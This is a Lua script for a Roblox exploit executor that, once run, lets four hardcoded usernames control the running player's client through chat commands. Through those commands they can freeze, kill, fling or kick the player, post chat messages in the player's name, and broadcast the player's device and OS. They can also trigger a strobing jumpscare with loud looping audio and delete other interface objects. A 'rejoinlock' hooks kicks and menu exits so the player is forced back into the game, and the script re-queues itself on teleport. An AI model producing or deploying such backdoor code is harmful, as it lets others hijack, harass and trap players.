if not game:IsLoaded() then game.Loaded:Wait() end

local PlayerController = [[
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local CoreGui = game:GetService("CoreGui")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local GuiService = game:GetService("GuiService")
local SoundService = game:GetService("SoundService")
local Lighting = game:GetService("Lighting")

local Admins = {
    "IlIIllIlIIlIllIIlllI",
    "6540a54402",
    "hamza_pro231",
    "C4N0Fz",
}

local Player = Players.LocalPlayer

local cmd = { commands = {} }
local conn = { connections = {} }
local var = { variables = {} }

function conn.new(name, event, callback)
    local ok, connection = pcall(function() return event:Connect(callback) end)
    if ok then conn.connections[name] = connection return connection end
end

function conn.remove(name)
    if conn.connections[name] then
        pcall(conn.connections[name].Disconnect, conn.connections[name])
        conn.connections[name] = nil
    end
end

function var.new(name, value)
    var.variables[name] = value
    return value
end

function var.get(name) return var.variables[name] end

function var.set(name, value) var.variables[name] = value end

var.new("originalWalkSpeed", 16)
var.new("originalJumpPower", 50)
var.new("isOrbiting", false)
var.new("isSpinning", false)
var.new("currentSpinSpeed", 0)
var.new("orbitConnection", nil)
var.new("spinConnection", nil)
var.new("rejoinLockEnabled", false)
var.new("menuOpenedConnection", nil)
var.new("kickHookActive", false)
var.new("originalKick", nil)
var.new("jumpscareActive", false)
var.new("jumpscareEffects", {})
var.new("jumpscareLoops", true)

function cmd.new(name, func)
    cmd.commands[name] = func
end

local function GetDevice()
    local touch = UserInputService.TouchEnabled
    local keyboard = UserInputService.KeyboardEnabled
    local mouse = UserInputService.MouseEnabled
    if touch and not keyboard and not mouse then return "Mobile"
    elseif not touch and keyboard and mouse then return "PC"
    else return "Unknown" end
end

local function GetOS()
    local platform = UserInputService:GetPlatform()
    local map = {
        [Enum.Platform.Windows] = "Windows",
        [Enum.Platform.OSX] = "macOS",
        [Enum.Platform.IOS] = "iOS",
        [Enum.Platform.Android] = "Android",
    }
    return map[platform] or "Unknown"
end

local function SendChat(message)
    pcall(function()
        if TextChatService.TextChannels then
            TextChatService.TextChannels.RBXGeneral:SendAsync(message)
        end
    end)
end

cmd.new("getdevice", function() SendChat("Player Device: " .. GetDevice()) end)
cmd.new("getos", function() SendChat("Player OS: " .. GetOS()) end)

cmd.new("freeze", function()
    local humanoid = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        var.set("originalWalkSpeed", humanoid.WalkSpeed)
        var.set("originalJumpPower", humanoid.JumpPower)
        humanoid.WalkSpeed = 0
        humanoid.JumpPower = 0
    end
    if Player.Character then
        for _, part in ipairs(Player.Character:GetDescendants()) do
            if part:IsA("BasePart") then part.Anchored = true end
        end
    end
end)

cmd.new("unfreeze", function()
    local humanoid = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.WalkSpeed = var.get("originalWalkSpeed")
        humanoid.JumpPower = var.get("originalJumpPower")
    end
    if Player.Character then
        for _, part in ipairs(Player.Character:GetDescendants()) do
            if part:IsA("BasePart") then part.Anchored = false end
        end
    end
end)

cmd.new("walkspeed", function(args)
    local speed = tonumber(args[1])
    if speed then
        local humanoid = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then humanoid.WalkSpeed = speed end
    end
end)

cmd.new("jumppower", function(args)
    local power = tonumber(args[1])
    if power then
        local humanoid = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then humanoid.JumpPower = power end
    end
end)

cmd.new("fling", function()
    local humanoid = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    local root = Player.Character and (Player.Character:FindFirstChild("HumanoidRootPart") or Player.Character:FindFirstChild("Head"))
    if root then
        local direction = Vector3.new(math.random(-100, 100), math.random(150, 600), math.random(-100, 100))
        root.Velocity = direction
        if humanoid then humanoid.Sit = true end
    end
end)

cmd.new("kill", function()
    local humanoid = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then humanoid.Health = 0 end
end)

cmd.new("sit", function()
    local humanoid = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then humanoid.Sit = true end
end)

cmd.new("orbit", function(args, admin)
    local adminRoot = admin.Character and admin.Character:FindFirstChild("HumanoidRootPart")
    local localRoot = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
    if not adminRoot or not localRoot then return end
    if var.get("isOrbiting") then
        var.set("isOrbiting", false)
        if var.get("orbitConnection") then
            var.get("orbitConnection"):Disconnect()
            var.set("orbitConnection", nil)
        end
    end
    var.set("isOrbiting", true)
    local angle, radius, speed = 0, 5, 2
    local orbitConnection = RunService.RenderStepped:Connect(function()
        if not var.get("isOrbiting") or not adminRoot or not adminRoot.Parent or not localRoot then
            if var.get("orbitConnection") then
                var.get("orbitConnection"):Disconnect()
                var.set("orbitConnection", nil)
            end
            var.set("isOrbiting", false)
            return
        end
        angle = angle + speed * RunService.RenderStepped:Wait()
        local offset = CFrame.new(adminRoot.Position) * CFrame.Angles(0, angle, 0) * CFrame.new(radius, 0, 0)
        localRoot.CFrame = offset
    end)
    var.set("orbitConnection", orbitConnection)
end)

cmd.new("unorbit", function()
    var.set("isOrbiting", false)
    if var.get("orbitConnection") then
        var.get("orbitConnection"):Disconnect()
        var.set("orbitConnection", nil)
    end
end)

cmd.new("spin", function(args)
    local speedNum = tonumber(args[1]) or 5
    local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    if var.get("isSpinning") then
        var.set("isSpinning", false)
        if var.get("spinConnection") then
            var.get("spinConnection"):Disconnect()
            var.set("spinConnection", nil)
        end
    end
    var.set("isSpinning", true)
    var.set("currentSpinSpeed", speedNum)
    local spinConnection = RunService.RenderStepped:Connect(function()
        if not var.get("isSpinning") or not hrp then
            if var.get("spinConnection") then
                var.get("spinConnection"):Disconnect()
                var.set("spinConnection", nil)
            end
            var.set("isSpinning", false)
            return
        end
        local dt = RunService.RenderStepped:Wait()
        local rotation = CFrame.Angles(0, math.rad(var.get("currentSpinSpeed") * dt), 0)
        hrp.CFrame = hrp.CFrame * rotation
    end)
    var.set("spinConnection", spinConnection)
end)

cmd.new("unspin", function()
    var.set("isSpinning", false)
    if var.get("spinConnection") then
        var.get("spinConnection"):Disconnect()
        var.set("spinConnection", nil)
    end
end)

cmd.new("kick", function(args)
    local reason = #args > 0 and table.concat(args, " ") or "Kicked by admin"
    Player:Kick(reason)
end)

cmd.new("bring", function(args, admin)
    local adminRoot = admin.Character and admin.Character:FindFirstChild("HumanoidRootPart")
    local localRoot = Player.Character and (Player.Character:FindFirstChild("HumanoidRootPart") or Player.Character:FindFirstChild("Head"))
    if adminRoot and localRoot then
        localRoot.CFrame = adminRoot.CFrame + Vector3.new(0, 3, 0)
    end
end)

cmd.new("chat", function(args)
    local msg = table.concat(args, " ")
    SendChat(msg)
end)

cmd.new("fps", function(args)
    local fps = tonumber(args[1])
    if fps then
        pcall(function()
            settings().Rendering.MaxFrameRate = math.clamp(fps, 1, 1000)
        end)
    end
end)

cmd.new("rejoinlock", function()
    if var.get("rejoinLockEnabled") then return end
    var.set("rejoinLockEnabled", true)
    getgenv().PlayerController.rejoinLockPersist = true
    local function rejoin()
        pcall(function() TeleportService:Teleport(game.PlaceId, Player) end)
    end
    if not var.get("kickHookActive") then
        var.set("originalKick", Player.Kick)
        var.set("kickHookActive", true)
        Player.Kick = function(reason) rejoin() end
    end
    local menuConn = GuiService.MenuOpened:Connect(function()
        rejoin()
    end)
    var.set("menuOpenedConnection", menuConn)
    local function onPlayerRemoving(player)
        if player == Player then rejoin() end
    end
    conn.new("rejoinLock_playerRemoving", Players.PlayerRemoving, onPlayerRemoving)
end)

cmd.new("unrejoinlock", function()
    if not var.get("rejoinLockEnabled") then return end
    var.set("rejoinLockEnabled", false)
    getgenv().PlayerController.rejoinLockPersist = false
    if var.get("menuOpenedConnection") then
        var.get("menuOpenedConnection"):Disconnect()
        var.set("menuOpenedConnection", nil)
    end
    conn.remove("rejoinLock_playerRemoving")
    if var.get("kickHookActive") then
        Player.Kick = var.get("originalKick") or Player.Kick
        var.set("kickHookActive", false)
        var.set("originalKick", nil)
    end
end)

cmd.new("jumpscare", function()
    if var.get("jumpscareActive") then return end
    var.set("jumpscareActive", true)
    var.set("jumpscareLoops", true)
    local effects = {}
    local colorCorrection = Instance.new("ColorCorrectionEffect")
    colorCorrection.TintColor = Color3.fromRGB(255, 0, 0)
    colorCorrection.Contrast = 2
    colorCorrection.Saturation = 1
    colorCorrection.Parent = Lighting
    table.insert(effects, colorCorrection)
    local blur = Instance.new("BlurEffect")
    blur.Size = 0
    blur.Parent = Lighting
    table.insert(effects, blur)
    local bloom = Instance.new("BloomEffect")
    bloom.Intensity = 2
    bloom.Size = 40
    bloom.Threshold = 0.8
    bloom.Parent = Lighting
    table.insert(effects, bloom)
    local sunRays = Instance.new("SunRaysEffect")
    sunRays.Intensity = 0.5
    sunRays.Spread = 0.5
    sunRays.Parent = Lighting
    table.insert(effects, sunRays)
    var.set("jumpscareEffects", effects)
    task.spawn(function()
        local toggle = true
        while var.get("jumpscareActive") do
            if toggle then
                colorCorrection.TintColor = Color3.fromRGB(255, 0, 0)
                blur.Size = 20
            else
                colorCorrection.TintColor = Color3.fromRGB(0, 0, 0)
                blur.Size = 0
            end
            toggle = not toggle
            task.wait(0.08)
        end
    end)
    task.spawn(function()
        while var.get("jumpscareActive") do
            local camera = workspace.CurrentCamera
            if camera then
                local offset = Vector3.new(
                    math.random(-30, 30) / 10,
                    math.random(-30, 30) / 10,
                    math.random(-20, 20) / 10
                )
                local rotOffset = CFrame.Angles(
                    math.rad(math.random(-20, 20)),
                    math.rad(math.random(-20, 20)),
                    math.rad(math.random(-20, 20))
                )
                camera.CFrame = camera.CFrame * rotOffset + offset
            end
            task.wait(0.03)
        end
    end)
    for _ = 1, 10 do
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://4899159505"
        sound.Volume = 10
        sound.PlaybackSpeed = 0.8
        sound.Parent = SoundService
        sound:Play()
        task.wait(0.05)
    end
    task.spawn(function()
        while var.get("jumpscareActive") and var.get("jumpscareLoops") do
            local loopedSound = Instance.new("Sound")
            loopedSound.SoundId = "rbxassetid://4899159505"
            loopedSound.Volume = 10
            loopedSound.PlaybackSpeed = 0.8
            loopedSound.Parent = SoundService
            loopedSound:Play()
            loopedSound.Ended:Wait()
            loopedSound:Destroy()
        end
    end)
end)

cmd.new("unjumpscare", function()
    var.set("jumpscareActive", false)
    var.set("jumpscareLoops", false)
    local effects = var.get("jumpscareEffects")
    for _, v in ipairs(effects) do
        if typeof(v) == "Instance" then v:Destroy() end
    end
    var.set("jumpscareEffects", {})
    local camera = workspace.CurrentCamera
    if camera then camera.CameraType = Enum.CameraType.Custom end
end)

cmd.new("delexec", function()
    pcall(function()
        local whitelistedContainers = {
            ["RobloxGui"] = true, ["PlayerList"] = true, ["ExperienceChat"] = true,
            ["BubbleChat"] = true, ["DevConsole"] = true, ["SocialService"] = true,
            ["PerformanceStats"] = true, ["ScreenShotTool"] = true, ["EmotesMenu"] = true,
            ["CallDialogScreen"] = true, ["CaptureManager"] = true, ["CaptureOverlay"] = true,
            ["Composer"] = true, ["ContactList"] = true, ["Chat"] = true,
            ["HeadsetDisconnectedDialog"] = true, ["InExperienceInterventionApp"] = true,
            ["PlayerMenuScreen"] = true, ["PurchasePromptApp"] = true, ["RobloxPromptGui"] = true,
            ["ScreenshotsCarousel"] = true, ["TeleportEffectGui"] = true, ["TopBarApp"] = true,
            ["ControlGui"] = true, ["VehicleGui"] = true, ["NotificationGui"] = true,
            ["DescendantProtector"] = true, ["AppUpdaterGui"] = true, ["FaceTrackingGui"] = true,
            ["ExperienceNotificationGui"] = true, ["VoiceChatGui"] = true, ["SafetyCheckGui"] = true,
            ["ToastGui"] = true, ["InGameMenuV2"] = true, ["RightClickMenu"] = true,
            ["VoiceChatPromptGui"] = true, ["BottomBarGui"] = true, ["GuiService"] = true,
            ["FullscreenTitleBar"] = true, ["TextureView"] = true, ["ChromeGui"] = true,
            ["BlockingApp"] = true, ["HealthGui"] = true, ["StutterDetector"] = true,
            ["AvatarContextMenuItem"] = true
        }
        local function getTopLevelContainer(obj)
            local current = obj
            while current.Parent and current.Parent ~= CoreGui and current.Parent ~= game do
                current = current.Parent
            end
            return current
        end
        local function isJumbled(name)
            if string.match(name, "[^%w%s%-%.]") then return true end
            if #name > 30 then return true end
            local upperCount = #string.gsub(name, "[^A-Z]", "")
            local lowerCount = #string.gsub(name, "[^a-z]", "")
            local totalLetters = upperCount + lowerCount
            if totalLetters > 5 then
                if string.match(name, "%u%u%u") then return true end
                local _, vowelCount = string.gsub(name:lower(), "[aeiouy]", "")
                if vowelCount == 0 or (vowelCount / totalLetters) < 0.15 then return true end
                if upperCount > 1 and lowerCount > 1 and string.match(name, "%l%u%l") then return true end
            end
            return false
        end
        for _, obj in ipairs(CoreGui:GetDescendants()) do
            local topContainer = getTopLevelContainer(obj)
            if topContainer and whitelistedContainers[topContainer.Name] then continue end
            if isJumbled(obj.Name) then
                pcall(function() obj:Destroy() end)
            end
        end
    end)
end)

local function executeCommand(commandName, args, admin)
    local command = cmd.commands[commandName]
    if command then
        local success, err = pcall(command, args, admin)
        if not success then warn("[!" .. commandName .. " error]: " .. tostring(err)) end
    end
end

local function onChatMessage(plr, msg)
    if plr == Player then return end
    if not table.find(Admins, plr.Name) then return end
    local commandMsg
    if string.sub(msg, 1, 1) == "!" then
        commandMsg = string.sub(msg, 2)
    elseif string.sub(msg, 1, 3) == "/e " then
        commandMsg = string.sub(msg, 4)
    else
        return
    end
    local parts = {}
    for part in string.gmatch(commandMsg, "%S+") do
        table.insert(parts, part)
    end
    if #parts > 0 then
        local cmdName = string.lower(parts[1])
        local args = { table.unpack(parts, 2) }
        executeCommand(cmdName, args, plr)
    end
end

for _, plr in ipairs(Players:GetPlayers()) do
    conn.new(plr.Name .. "_chatted", plr.Chatted, function(msg) onChatMessage(plr, msg) end)
end

conn.new("player_added", Players.PlayerAdded, function(plr)
    conn.new(plr.Name .. "_chatted", plr.Chatted, function(msg) onChatMessage(plr, msg) end)
end)

if getgenv().PlayerController and getgenv().PlayerController.rejoinLockPersist then
    task.wait(0.5)
    pcall(function() cmd.commands["rejoinlock"]() end)
end
]]

if not getgenv().PlayerController then getgenv().PlayerController = {} end
if getgenv().PlayerController.isLoaded then
    error("PlayerController already loaded", 0)
end

getgenv().PlayerController.isLoaded = true

if queue_on_teleport then
    queue_on_teleport(PlayerController)
end

local success, err = loadstring(PlayerController)()
if not success then error(err, 0) end
